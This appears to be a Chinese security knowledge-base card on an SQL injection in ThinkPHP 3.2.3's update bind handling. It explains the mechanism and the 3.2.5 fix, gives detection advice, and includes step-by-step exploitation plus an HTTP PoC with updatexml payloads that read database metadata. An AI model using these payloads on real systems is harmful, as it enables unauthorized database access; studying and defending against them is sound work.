---
id: web-generic-sqli-thinkphp32-update-bind-placeholder-strtr-injection
title: ThinkPHP 3.2.3 update bind 注入：id[]=bind 借 execute() 的 strtr 占位符替换把 SQL 片段带进 WHERE
type: scenario
domain: web
path: web/generic/sqli
technique: thinkphp32-update-bind-placeholder-strtr-injection
aliases:
- update bind 注入
- id[]=bind
- parseWhereItem bind 分支
- strtr 占位符替换注入
- ThinkPHP 3.2.3 update 注入
- save() bind 注入
tags:
- php
- thinkphp
- thinkphp3
- sqli
- bind
- placeholder
- update
- parsewhereitem
- error-based
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-09'
updated: '2026-11-09'
affected_versions: ThinkPHP 3.2.3（文中修复于 3.2.5）
verification:
  verified_by: verifier-V422
  verified_at: '2026-11-09T17:02:53+08:00'
  notes: 已对照原文与6张图片核对：parseWhereItem 的 bind 分支原样拼接 :编号+片段、execute() 用 strtr 只替换占位符、图05 确认 3.2.5 think_filter 黑名单加入 BIND；affected_versions『ThinkPHP 3.2.3（修复于 3.2.5）』有原文依据，保留。PoC 未在 TP3.2.3 环境实测；原文最终 SQL 示例中 username/id 显示为 0，与按机制推导的 '1' 略有出入，卡内合成示例已注明按绑定编号/字段顺序调整。dedup top 候选为 parseThinkWhere 特殊键、find options where 字符串、TP5 order、exp 数组，均非 bind+strtr 链。
---

## 一句话结论

ThinkPHP 3.2.3 的 `where()` 数组里，字段值可以是 `['bind', '<占位符编号 + SQL 片段>']`；`parseWhereItem()` 的 `bind` 分支不做转义，直接拼出 `字段 = :编号<SQL片段>`。随后 `execute()` 用 `strtr` 把 `:编号` 替换成绑定值（如 `username` 的转义值），只替换占位符本身、保留尾随片段，于是 `?id[]=bind&id[]=1 and updatexml(...)&email=x&username=1` 能在 UPDATE 的 WHERE 中执行任意 SQL。

## 原理

- **入口代码形态**：控制器 `$user['id'] = I('id'); $data['email'] = I('email'); $User->where($user)->save($data);`。`I('id')` 允许数组，`id[]=bind&id[]=1 and ...` 解析为 `['bind', '1 and ...']` 并进入 `options['where']`。
- **bind 分支直接拼接**：`parseWhereItem()` 中 `elseif ('bind' == $exp) { $whereStr .= $key . ' = :' . $val[1]; }`。`$val[1]` 被当作“绑定参数名”使用，但代码没有限制其内容，攻记者可以让它以数字开头再跟任意 SQL。
- **bind 数组从哪来**：`update()` 先 `parseBind($options['bind'])`（通常为空），再 `parseSet($data)` 生成 `email = :0` 并把 `$data` 的值放进 `$this->bind`；`where` 里的 `:1` 会撞上 `$data` 第二个字段（如 `username`）的绑定编号。
- **execute 的 strtr 替换**：`execute()` 中有 `$this->queryStr = strtr($this->queryStr, array_map(function ($val) { return '\'' . $this->escapeString($val) . '\''; }, $this->bind));`。`strtr` 以绑定键（`:0`、`:1`）为模式做最长匹配替换，只替换占位符部分；攻击者片段里 `:1` 之后的 `and updatexml(...)` 原样保留。
- **最终 SQL**：`UPDATE users SET email='test.com', username='1' WHERE id='1' and updatexml(1,concat(0x7e,user(),0x7e),1)`。注入发生在 UPDATE 的 WHERE 子句，报错内容随页面回显。
- **为什么能绕过常规转义**：`parseSet` 的值和 `where` 的普通值都走 `escapeString`，但 `bind` 分支把用户值当作占位符表达式，真正被转义的是“绑定值”（如 username），而不是 `$val[1]` 中的 SQL 片段；`strtr` 只替换 `:1`，不处理其后内容。
- **修复**：3.2.5 在 `think_filter()` 的黑名单正则中加入 `BIND`，`I()` 取到 `bind` 时会在末尾补一个空格，`'bind' == $exp` 不再成立，bind 分支无法被用户触发。

## 触发条件

- 目标为 ThinkPHP 3.2.3（修复于 3.2.5），存在用户可控数组经 `I()` 进入 `where()` 并执行 `save()`/`update()` 的代码。
- 请求可传 `id[]=bind&id[]=<编号+SQL>` 形式，且同一请求带至少一个会生成绑定编号的数据字段（如 `email`、`username`）。
- 数据库为 MySQL 且报错回显可用（示例 `updatexml`）；关闭报错时可用时间盲注（`sleep`）或布尔条件。
- `where` 条件与 `SET` 字段能构成合法 UPDATE 语句（字段名来自代码或可控但合法）。

## 利用步骤

1. 找到 `where(I('id'))->save($data)`、`where(I('post.'))->save()` 一类入口，确认 `id` 以数组形式进入 where。
2. 先发正常请求 `?id=3&email=test123`，观察 UPDATE 是否执行、页面是否回显影响行数。
3. 构造 bind：`?id[]=bind&id[]=1&email=test.com&username=test123`，观察 SQL 变为 `UPDATE ... SET email=:0, username=:1 WHERE id=:1`。
4. 注入：`?id[]=bind&id[]=1 and updatexml(1,concat(0x7e,user(),0x7e),1)&email=test.com&username=1`，页面应出现 `XPATH syntax error: '~root@...~'`。
5. 缩短 payload：`id[1]=0` 代替 `id[]=1`，并用 `id[]=bind&id[]=0 and updatexml(...)&email=1`（视字段绑定顺序调整编号）。
6. 无回显时把 `updatexml` 换成 `extractvalue`、`sleep(5)` 或布尔条件，按响应时间/页面差异判断。
7. 读取 `database()`、`user()`、`information_schema` 元数据，评估是否能进一步读写文件。

## PoC

```http
POST /index.php?m=home&c=index&a=index HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

id[]=bind&id[]=1%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)&email=test.com&username=1
```

```sql
UPDATE `users` SET `email`='test.com', `username`='1'
WHERE `id`='1' and updatexml(1,concat(0x7e,user(),0x7e),1)
```

说明：`username` 的值用于替换 `:1`，注入片段位于占位符之后；不同控制器字段顺序会改变编号，按实际 `parseSet` 输出调整。

## 变体与关联

- 缩短形态：`?id[]=bind&id[]=0 and updatexml(...)&email=1`，少传一个数据字段，依赖 `:0` 与 email 的绑定。
- 其它写入路径：`save()`、`setField()`、`delete()` 等最终都经过 `update()`/`execute()` 的 bind 替换，入口相同即可复用。
- 数组键变体：`id[1]=...` 与 `id[]=...` 解析结果相同；`id[0]=bind&id[1]=...` 也可。
- 关联：[[web-generic-sqli-thinkphp3-parsewhere-special-key-injection]]（where 数组 `_string`/`_complex` 拼接）、[[web-generic-sqli-thinkphp3-array-exp-union-blacklist-bypass]]（`['exp', ...]` 原始表达式）、[[web-generic-sqli-thinkphp32-find-options-where-string-injection]]（options where 字符串直拼）。
- 边界：`I()` 的 `think_filter` 在 3.2.5 起会破坏 `bind` 关键字；若应用自行过滤数组或使用参数绑定，该链失效。

## 检测与防御

- **代码层**：禁止把请求数组直接传给 `where()`；对 `bind`/`exp`/`_string` 等特殊表达式键显式拒绝；所有条件使用参数绑定，数据字段值强制类型转换。
- **框架层**：升级 ThinkPHP 3.2.5+；无法升级时在 `parseWhereItem()` 的 `bind` 分支校验 `$val[1]` 必须是纯数字占位符，或直接禁用用户输入的 bind。
- **检测**：请求体出现 `id[]=bind`、`[0]=bind`、`[1]=bind`；SQL 日志出现 `= :数字` 后紧跟 `and`/`or`/`updatexml`/`sleep`；同接口短时间大量 `bind` 数组探测与报错。
- **加固**：生产关闭详细报错；数据库账号最小权限；WAF 对 `bind` 数组与 SQL 函数组合告警（仅缓解，需配合代码修复）。
